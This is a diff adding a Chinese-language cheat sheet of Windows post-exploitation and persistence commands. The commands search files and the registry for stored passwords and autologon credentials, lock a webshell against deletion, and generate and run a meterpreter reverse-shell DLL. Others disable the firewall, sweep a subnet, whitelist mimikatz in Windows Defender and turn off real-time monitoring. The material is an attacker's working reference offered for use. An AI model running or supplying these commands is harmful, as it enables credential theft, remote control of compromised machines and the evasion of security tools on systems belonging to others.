@@ -1,1 +1,88 @@
 persistence windows 权限维持
+
+$f=new-object -comobject hnetcfg.fwpolicy2 ; $f.rules | ? { $_.action -eq "0" } | select name,applicationname,localports #列出所有防火墙阻止的端口
+
+
+
+gci c:\users\ -include *passw* -recurse
+
+where /r c:\ *passw*.txt
+
+for /r c:\ %i in (*passw*.txt) do @echo %i
+
+gci c:\ -recurse | ? { $_ -like "*passw*.txt" }
+
+
+
+reg query hkcu /f password /t reg_sz /s > temp.txt
+
+reg query "hklm\software\microsoft\windows nt\currentversion\winlogon" #自动登录的账号和密码
+
+###### 文件加锁
+
+```
+lsattr +i shell.php #查看文件加锁情况
+
+chattr +i shell.php #加锁 无法修改，删除，重命名，不能创建链接，不能写入数据
+
+chattr -i shell.php #解锁
+
+chattr +a /ver/log/messages #只能追加不能删除
+```
+
+#### 
+
+tree c:\ > c:\users\xxx\desktop\tree.txt #获取某个磁盘的文件夹树，并将结果输出到文本文件
+
+dir /s c:\ > c:\users\win2019\desktop\file.txt #获取某个磁盘的文件列表，并将结果输出到文本文件
+
+
+
+msfvenom -p windows/meterprter/reverse_tcp lhost lport -f dll -o shell.dll
+
+rundll32 shell.dll,DllMain
+
+
+
+for %i in (C D E F G H I G K L M N) do @( if exist %i:\ ( @echo %i: exist! ) )
+
+
+
+netsh advfirewall show allprofiles #查看防火墙基础信息
+netsh advfirewall firewall show rule name="Allow 8080 TCP" #查看防火墙规则状态
+
+netsh advfirewall set allprofiles state off #关闭防火墙
+netsh advfirewall set allprofiles state on #打开防火墙
+
+netsh advfirewall firewall add rule name="Allow 8080 TCP" dir=in action=allow protocol=TCP localport=8080 #开通一条防火墙规则,名字为"Allow 8080 TCP",开启8080端口,允许外部访问本地8080端口，协议为tcp
+
+netsh advfirewall firewall add rule name="block 8080 TCP" dir=in action=block protocol=TCP localport=8080 #开通一条防火墙规则,名字为"block 8080 TCP",关闭8080端口,不允许外部访问本地8080端口，协议为tcp
+
+
+netsh advfirewall firewall delete rule name="Allow 8080 TCP" #删除名字为Allow 8080 TCP 的防火墙规则
+
+
+
+
+
+1..255 | % { ping -w 1 -n 1 192.168.10.$_ | findstr TTL } 
+
+系统共生，利用信任，少既是多。
+
+工具的使用遵循小而巧，单一工具解决单一问题。可以更好的保持过程的健壮性。
+
+
+
+
+
+get-mpcomputerstatus #获取windows defender状态
+
+
+
+add-mppreference -exclusionpath "c:\temp" #添加检查排除文件夹
+
+add-mppreference -exclusionpath "mimikatz.exe" #排除进程
+
+remove-mppreference -exclusionpath "xxx" #移除检查排除
+
+set-mppreference -disablerealtimemonitoring $true #关闭windows defender(需要管理员权限，并已经关闭篡改服务)
